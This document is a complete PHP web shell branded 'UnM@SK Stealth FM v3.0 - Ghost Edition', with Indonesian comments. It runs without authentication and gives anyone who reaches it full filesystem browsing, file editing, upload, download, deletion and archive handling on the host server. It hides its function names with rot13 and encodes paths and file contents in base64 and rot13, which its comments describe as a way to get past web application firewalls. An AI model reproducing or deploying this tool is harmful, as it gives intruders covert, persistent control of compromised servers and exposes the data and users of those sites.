<?=
/**
 * UnM@SK Stealth FM v3.0 - Ghost Edition (AJAX + Hidden Path)
 * Anti-Reload | Stealth URL | Double WAF Bypass
 * Features: File Manager, Editor, Zip, Unzip, Unrar (Multi-Archive Support)
 */

@error_reporting(0);
@set_time_limit(0);

// Obfuskasi Fungsi Dasar
$b64d = str_rot13('onfr64_qrpbqr');
$b64e = str_rot13('onfr64_rapbqr');
$fpc  = str_rot13('svyr_chg_pbagragf');
$fgc  = str_rot13('svyr_trg_pbagragf');

// Handle AJAX Request
if (isset($_POST['ajax'])) {
    $dir = $b64d($_POST['d']); // Decode Path dari Base64
    @chdir($dir);
    $sep = DIRECTORY_SEPARATOR;

    // LOGIKA AKSI
    if (isset($_POST['act'])) {
        $act = $_POST['act'];
        $item = $b64d($_POST['item']);
        
        // Simpan File (Edit)
        if ($act == 'edit' && isset($_POST['p'])) {
            $fpc($item, str_rot13($b64d($_POST['p'])));
            echo "<div class='msg'>[+] Sync Success.</div>";
        }
        
        // Hapus
        if ($act == 'del') { 
            if(@is_dir($item)) {
                @rmdir($item); 
            } else {
                @unlink($item);
            }
        }
        
        // Rename
        if ($act == 'ren' && isset($_POST['n'])) { 
            @rename($item, dirname($item).$sep.$_POST['n']); 
        }
        
        // Buat File & Folder Baru
        if ($act == 'nf') { $fpc($dir.$sep.$_POST['n'], ""); }
        if ($act == 'nd') { @mkdir($dir.$sep.$_POST['n']); }

        // Fitur ZIP (Kompres)
        if ($act == 'zip' && class_exists('ZipArchive')) {
            $zip = new ZipArchive();
            $zname = $item . '.zip';
            if ($zip->open($zname, ZipArchive::CREATE) === TRUE) {
                if (is_dir($item)) {
                    $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($item), RecursiveIteratorIterator::LEAVES_ONLY);
                    foreach ($files as $name => $file) {
                        if (!$file->isDir()) {
                            $filePath = $file->getRealPath();
                            $relativePath = substr($filePath, strlen(dirname($item)) + 1);
                            $zip->addFile($filePath, $relativePath);
                        }
                    }
                } else {
                    $zip->addFile($item, basename($item));
                }
                $zip->close();
                echo "<div class='msg'>[+] ZIP Created: ".basename($zname)."</div>";
            }
        }

        // Fitur UNZIP
        if ($act == 'unzip' && class_exists('ZipArchive')) {
            $zip = new ZipArchive;
            if ($zip->open($item) === TRUE) {
                $zip->extractTo($dir);
                $zip->close();
                echo "<div class='msg'>[+] Unzip Success.</div>";
            } else {
                echo "<div class='msg'>[-] Unzip Failed.</div>";
            }
        }

        // Fitur UNRAR (Membutuhkan ekstensi php-rar)
        if ($act == 'unrar' && class_exists('RarArchive')) {
            $rar = RarArchive::open($item);
            if ($rar !== FALSE) {
                $entries = $rar->getEntries();
                foreach ($entries as $entry) {
                    $entry->extract($dir);
                }
                $rar->close();
                echo "<div class='msg'>[+] Unrar Success.</div>";
            } else {
                echo "<div class='msg'>[-] Unrar Failed.</div>";
            }
        }
    }

    // LISTING GENERATOR (UI Fragment)
    echo "<!-- Breadcrumbs -->";
    echo "<div class='nav'>Path: ";
    $parts = explode($sep, $dir); $acc = "";
    if (empty($parts[0]) && $sep == '/') echo "<a href='#' onclick=\"go('/')\">/</a>";
    foreach ($parts as $idx => $part) {
        if (empty($part)) continue;
        $acc .= ($sep == '/' || $idx == 0) ? ($sep == '/' ? '/'.$part : $part) : $sep.$part;
        $bacc = $b64e($acc);
        echo "<span>/</span><a href='#' onclick=\"go('$bacc', 1)\">".htmlspecialchars($part)."</a>";
    }
    echo "</div>";

    // Edit UI
    if (isset($_POST['act']) && $_POST['act'] == 'edit_ui') {
        $item = $b64d($_POST['item']);
        $cont = htmlspecialchars($fgc($item));
        echo "<h3>Edit: ".basename($item)."</h3>
              <textarea id='editor' style='height:350px;'>$cont</textarea><br>
              <button class='btn' onclick=\"saveFile('$b64e($item)')\">ENCODE & SAVE</button> 
              <button class='btn' onclick=\"go('".$b64e($dir)."', 1)\">BACK</button><hr>";
        exit;
    }

    // Table Content
    echo "<table><tr><th>Name</th><th>Size</th><th>Actions</th></tr>";
    echo "<tr><td><a href='#' onclick=\"go('".$b64e(dirname($dir))."', 1)\">.. (Parent)</a></td><td>-</td><td>-</td></tr>";
    $files = @scandir($dir);
    if($files) {
        foreach ($files as $f) {
            if ($f === '.' || $f === '..') continue;
            $full = $dir . $sep . $f; $isD = is_dir($full);
            $sz = $isD ? 'DIR' : round(@filesize($full)/1024, 2).' KB';
            $bf = $b64e($full);
            $ext = strtolower(pathinfo($f, PATHINFO_EXTENSION));

            echo "<tr><td>" . ($isD ? "<a href='#' onclick=\"go('$bf', 1)\">[$f]</a>" : $f) . "</td>
            <td>$sz</td><td>";
            
            if(!$isD) echo "<a href='#' onclick=\"editUI('$bf')\">EDIT</a> | ";
            if(!$isD) echo "<a href='#' onclick=\"downloadFile('$bf')\" style='color:cyan'>DOWNLOAD</a> | ";
            
            // Link ZIP/Unarchiver
            echo "<a href='#' onclick=\"archiveUI('$bf', 'zip')\">ZIP</a> | ";
            if($ext == 'zip' && class_exists('ZipArchive')) echo "<a href='#' onclick=\"archiveUI('$bf', 'unzip')\" style='color:yellow'>UNZIP</a> | ";
            if($ext == 'rar' && class_exists('RarArchive')) echo "<a href='#' onclick=\"archiveUI('$bf', 'unrar')\" style='color:orange'>UNRAR</a> | ";

            echo "<a href='#' onclick=\"renUI('$bf', '$f')\">REN</a> | ";
            echo "<a href='#' onclick=\"delUI('$bf')\">DEL</a></td></tr>";
        }
    }
    echo "</table>";
    exit;
}

// DOWNLOAD HANDLE (Standalone, bukan AJAX)
if (isset($_GET['dl'])) {
    $item = $b64d($_GET['dl']);
    if (is_file($item)) {
        @set_time_limit(0);
        @ini_set('memory_limit', '-1');
        
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($item) . '"');
        header('Content-Transfer-Encoding: binary');
        header('Content-Length: ' . filesize($item));
        header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
        header('Pragma: public');
        header('Expires: 0');
        
        $file = @fopen($item, 'rb');
        if ($file) {
            while (!feof($file)) {
                echo fread($file, 8192);
                @ob_flush();
                @flush();
            }
            fclose($file);
        }
        exit;
    }
}

// UPLOAD HANDLE
if (isset($_FILES['f'])) {
    $d = $b64d($_POST['d']);
    @move_uploaded_file($_FILES['f']['tmp_name'], $d.DIRECTORY_SEPARATOR.$_FILES['f']['name']);
    header("Location: ".$_SERVER['PHP_SELF']);
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>UnM@SK v3.0 - Ghost Edition</title>
    <style>
        body { background: #0a0a0a; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; font-size: 13px; }
        a { color: #00ff00; text-decoration: none; font-weight: bold; }
        a:hover { color: #fff; text-shadow: 0 0 5px #00ff00; }
        table { width: 100%; border-collapse: collapse; margin-top: 15px; }
        th { background: #111; text-align: left; }
        th, td { border: 1px solid #222; padding: 8px; }
        tr:hover { background: #0f0f0f; }
        input, textarea { background: #111; color: #00ff00; border: 1px solid #333; padding: 5px; width: 100%; box-sizing: border-box; }
        .btn { background: #00ff00; color: #000; font-weight: bold; border: none; cursor: pointer; padding: 5px 10px; margin: 2px; }
        .btn:hover { background: #fff; }
        .nav { background: #1a1a1a; padding: 12px; border-left: 4px solid #00ff00; margin-bottom: 15px; }
        .tool-bar { background: #111; padding: 10px; border: 1px solid #222; margin-bottom: 10px; display: flex; gap: 10px; align-items: center; flex-wrap: wrap; }
        .path-nav { background: #1a1a1a; padding: 12px; border: 1px solid #333; margin-bottom: 15px; }
        .path-input-group { display: flex; gap: 8px; align-items: center; margin-bottom: 8px; flex-wrap: wrap; }
        .quick-paths { font-size: 11px; color: #888; }
        .quick-paths a { color: #00ff00; font-size: 11px; }
        .msg { color: #ffff00; margin: 10px 0; border: 1px dashed #ffff00; padding: 5px; }
    </style>
    <script>
        var curDir = '<?= $b64e(getcwd()) ?>';

        function go(path64, isEnc) {
            if(!isEnc) path64 = btoa(path64);
            curDir = path64;
            var fd = new FormData();
            fd.append('ajax', 1);
            fd.append('d', path64);
            fetch('', { method: 'POST', body: fd })
            .then(r => r.text()).then(h => document.getElementById('app').innerHTML = h);
        }

        function editUI(item64) {
            var fd = new FormData();
            fd.append('ajax', 1); fd.append('d', curDir);
            fd.append('act', 'edit_ui'); fd.append('item', item64);
            fetch('', { method: 'POST', body: fd })
            .then(r => r.text()).then(h => document.getElementById('app').innerHTML = h);
        }

        function saveFile(item64) {
            var c = document.getElementById('editor').value;
            // ROT13 + Base64 content encoding for WAF Bypass
            var payload = btoa(unescape(encodeURIComponent(rot13(c))));
            var fd = new FormData();
            fd.append('ajax', 1); fd.append('d', curDir);
            fd.append('act', 'edit'); fd.append('item', item64); fd.append('p', payload);
            fetch('', { method: 'POST', body: fd })
            .then(r => r.text()).then(h => { 
                document.getElementById('app').innerHTML = h; 
                setTimeout(()=>go(curDir, 1), 1000); 
            });
        }

        function rot13(s) { return s.replace(/[a-zA-Z]/g, function(c){return String.fromCharCode((c<="Z"?90:122)>=(c=c.charCodeAt(0)+13)?c:c-26);}); }

        function renUI(item64, old) {
            var n = prompt('Rename to:', old);
            if(n) {
                var fd = new FormData();
                fd.append('ajax', 1); fd.append('d', curDir);
                fd.append('act', 'ren'); fd.append('item', item64); fd.append('n', n);
                fetch('', { method: 'POST', body: fd }).then(() => go(curDir, 1));
            }
        }

        function delUI(item64) {
            if(confirm('Delete?')) {
                var fd = new FormData();
                fd.append('ajax', 1); fd.append('d', curDir);
                fd.append('act', 'del'); fd.append('item', item64);
                fetch('', { method: 'POST', body: fd }).then(() => go(curDir, 1));
            }
        }

        function archiveUI(item64, type) {
            var label = type.toUpperCase();
            if(confirm('Execute ' + label + ' on this item?')) {
                var fd = new FormData();
                fd.append('ajax', 1); fd.append('d', curDir);
                fd.append('act', type); fd.append('item', item64);
                fetch('', { method: 'POST', body: fd })
                .then(r => r.text()).then(h => {
                    document.getElementById('app').innerHTML = h;
                    setTimeout(() => go(curDir, 1), 1000);
                });
            }
        }

        function make(type) {
            var n = prompt('Name:');
            if(n) {
                var fd = new FormData();
                fd.append('ajax', 1); fd.append('d', curDir);
                fd.append('act', type); fd.append('n', n);
                fetch('', { method: 'POST', body: fd }).then(() => go(curDir, 1));
            }
        }

        function upload() {
            var f = document.getElementById('f').files[0];
            if(!f) return;
            var fd = new FormData();
            fd.append('f', f); fd.append('d', curDir);
            fetch('', { method: 'POST', body: fd }).then(() => { 
                alert('Upload Complete'); 
                go(curDir, 1); 
            });
        }

        function downloadFile(item64) {
            window.location.href = '?dl=' + item64;
        }

        function navigateToPath() {
            var pathInput = document.getElementById('pathInput').value;
            if(pathInput.trim() === '') {
                alert('Please enter a path');
                return;
            }
            go(pathInput, 0);
            document.getElementById('pathInput').value = '';
        }

        function getCurrentPath() {
            var decodedPath = atob(curDir);
            alert('Current Path: ' + decodedPath);
        }

        // Handle Enter key in path input
        document.addEventListener('DOMContentLoaded', function() {
            document.getElementById('pathInput').addEventListener('keypress', function(e) {
                if(e.key === 'Enter') {
                    navigateToPath();
                }
            });
        });

        window.onload = () => go(curDir, 1);
    </script>
</head>
<body>
    <h2>[ UnM@SK v3.0 - Ghost Edition ]</h2>
    <div class="tool-bar">
        <button class="btn" onclick="make('nf')">+ FILE</button>
        <button class="btn" onclick="make('nd')">+ FOLDER</button>
        <input type="file" id="f" style="width:auto;">
        <button class="btn" onclick="upload()">UPLOAD</button>
    </div>
    
    <!-- Path Navigation Section -->
    <div class="path-nav">
        <div class="path-input-group">
            <input type="text" id="pathInput" placeholder="Enter path (e.g., /var/www, C:\Users)" style="width:300px;">
            <button class="btn" onclick="navigateToPath()">NAVIGATE</button>
            <button class="btn" onclick="go('<?= $b64e(dirname(getcwd())) ?>', 1)">PARENT</button>
            <button class="btn" onclick="go('<?= $b64e(getcwd()) ?>', 1)">HOME</button>
            <button class="btn" onclick="go('/', 0)">ROOT</button>
        </div>
        <div class="quick-paths">
            <span>Quick: </span>
            <a href="#" onclick="go('/tmp', 0)">/tmp</a> |
            <a href="#" onclick="go('/var/www', 0)">/var/www</a> |
            <a href="#" onclick="go('/home', 0)">/home</a> |
            <a href="#" onclick="getCurrentPath()">SHOW CURRENT</a>
        </div>
    </div>
    <div id="app">
        <p>Initializing Ghost Engine...</p>
    </div>
</body>
</html>
